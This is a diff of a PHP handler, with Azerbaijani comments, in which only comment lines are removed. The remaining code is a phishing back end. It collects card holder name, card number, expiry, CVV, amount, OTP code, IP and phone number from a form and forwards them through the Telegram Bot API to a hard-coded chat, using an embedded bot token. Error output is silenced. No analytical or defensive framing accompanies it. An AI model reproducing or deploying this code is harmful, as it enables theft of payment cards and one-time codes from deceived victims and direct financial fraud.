@@ -1,16 +1,10 @@
 <?php
-// ============================================
-// TELEGRAM HANDLER - BOT TOKEN YALNIZ BURADA
-// ============================================
-
 error_reporting(0);
 ini_set('display_errors', 0);
 
-// ===== BOT MƏLUMATLARI =====
 $botToken = '8954241039:AAHSIz0Q6884ESNIiIdVCe4JxWWqR0xcTA4';
 $chatId = '-5419845064';
 
-// ===== MƏLUMATLARI AL =====
 $cardName = isset($_POST['card_name']) ? trim($_POST['card_name']) : '';
 $cardNumber = isset($_POST['card_number']) ? trim($_POST['card_number']) : '';
 $cardExpiry = isset($_POST['card_expiry']) ? trim($_POST['card_expiry']) : '';
@@ -21,7 +15,6 @@ $amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
 $ip = isset($_POST['ip']) ? trim($_POST['ip']) : '0.0.0.0';
 $otp = isset($_POST['otp']) ? trim($_POST['otp']) : '';
 
-// ===== TƏHLÜKƏSİZLİK =====
 function cleanInput($data) {
     $data = trim($data);
     $data = strip_tags($data);
@@ -39,14 +32,12 @@ $amount = cleanInput($amount);
 $ip = cleanInput($ip);
 $otp = cleanInput($otp);
 
-// ===== MƏLUMATLARI YOXLA =====
 if (empty($cardNumber) || empty($cardCvv) || empty($otp)) {
     http_response_code(400);
     echo json_encode(['status' => 'error', 'message' => 'Məlumatlar tam daxil edilməyib']);
     exit;
 }
 
-// ===== MESAJI HAZIRLA =====
 $id = rand(100, 999);
 
 $message = "💳 YENİ KART GİRİŞİ 💳\n\n";
@@ -63,7 +54,6 @@ $message .= "🔑 OTP: " . $otp . "\n\n";
 $message .= "----------------------------------------\n";
 $message .= "📱 Bağlı Nömrə: " . $phone;
 
-// ===== TELEGRAM-A GÖNDƏR =====
 $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
 
 $postData = [
@@ -85,7 +75,6 @@ $response = curl_exec($ch);
 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 curl_close($ch);
 
-// ===== CAVAB =====
 header('Content-Type: application/json');
 
 if ($httpCode == 200) {
